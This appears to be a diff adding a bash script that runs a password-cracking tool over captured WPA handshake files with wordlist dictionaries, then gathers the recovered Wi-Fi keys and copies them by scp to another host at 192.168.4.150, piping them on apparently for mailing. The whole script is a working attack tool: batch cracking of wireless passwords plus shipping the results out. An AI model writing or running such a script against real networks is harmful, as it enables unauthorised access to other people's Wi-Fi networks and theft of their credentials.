@@ -1,0 +1,45 @@
+#!/bin/bash
+
+dir=$1
+cd $dir
+
+cpu_num=40
+
+cap_dir="caps"
+oldcap_dir="$cap_dir/old_caps"
+dict_dir="dicts"
+out_dir="out"
+
+dicts=$(find $dict_dir -name *.txt)
+# dicts=$(ls $dict_dir/*.txt -1)
+[ $? != 0 ] && { echo 'no dicts!'; exit; }
+
+caps=$(ls $cap_dir/*.cap -1)
+[ $? != 0 ] && { echo 'no caps need crack!'; exit; }
+
+[ -d "$oldcap_dir" ] || mkdir -p $oldcap_dir
+[ -d "$out_dir" ] || mkdir -p $out_dir
+
+for cap in $caps; do
+    for dict in $dicts; do
+        wanted=$out_dir/final$cap\.txt
+        echo \( $(date +%d\ %H:%M) \) working on $cap use $dict ......
+        $VGLD_CRACK_DIR/make $cap -p $cpu_num -w $dict -l $wanted > /dev/null
+        [ -f "$wanted" ] && { echo crack one done!; mv $cap $oldcap_dir; break; }
+        [ "$(date +%H)" -eq '7' ] && exit
+    done
+    echo sleep 5m && sleep 5m
+done
+
+echo msg=sendmail > tmp
+echo title=wpa >> tmp
+
+word='body='
+for line in $(find $out_dir/*); do
+    word="$word+$line+$(cat $line)"
+done
+    echo word $word
+    echo "$word" >> tmp
+
+scp tmp user@192.168.4.150:/tmp/wpa
+ssh user@192.168.4.150 "cat /tmp/wpa > /tmp/.vpipe"
